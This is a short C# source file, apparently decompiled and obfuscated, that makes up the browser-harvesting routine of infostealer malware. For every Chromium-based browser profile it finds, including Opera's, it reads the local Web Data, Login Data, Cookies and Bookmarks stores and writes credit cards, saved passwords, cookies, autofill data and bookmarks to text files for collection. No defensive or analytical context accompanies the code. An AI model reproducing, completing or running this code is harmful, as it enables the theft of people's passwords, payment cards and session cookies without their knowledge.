using System.Collections.Generic;
using System.IO;

internal sealed class Class88
{
	public static void smethod_0(string string_0)
	{
		if (!Directory.Exists(string_0))
		{
			Directory.CreateDirectory(string_0);
		}
		string[] string_ = Class52.string_0;
		foreach (string text in string_)
		{
			string path = ((!text.Contains("Opera Software")) ? (Class52.string_4 + text) : (Class52.string_3 + text));
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string obj in directories)
				{
					string text2 = string_0 + "\\" + Class87.smethod_5(text);
					Directory.CreateDirectory(text2);
					List<Struct1> list_ = Class90.smethod_0(obj + "\\Web Data");
					List<GStruct0> list_2 = Class93.smethod_0(obj + "\\Login Data");
					List<Struct0> list_3 = Class89.smethod_0(obj + "\\Cookies");
					List<Struct2> list_4 = Class84.smethod_0(obj + "\\Web Data");
					List<Struct4> list_5 = Class86.smethod_0(obj + "\\Bookmarks");
					Class58.smethod_9(list_, text2 + "\\CreditCards.txt");
					Class58.smethod_8(list_2, Class38.string_11 + "\\Passwords.txt");
					Class58.smethod_5(list_3, string_0 + $"\\Cookies_{Class87.smethod_5(text)}({Class37.smethod_1()}).txt");
					Class58.smethod_6(list_4, text2 + "\\AutoFill.txt");
					Class58.smethod_7(list_5, text2 + "\\Bookmarks.txt");
				}
			}
		}
	}
}
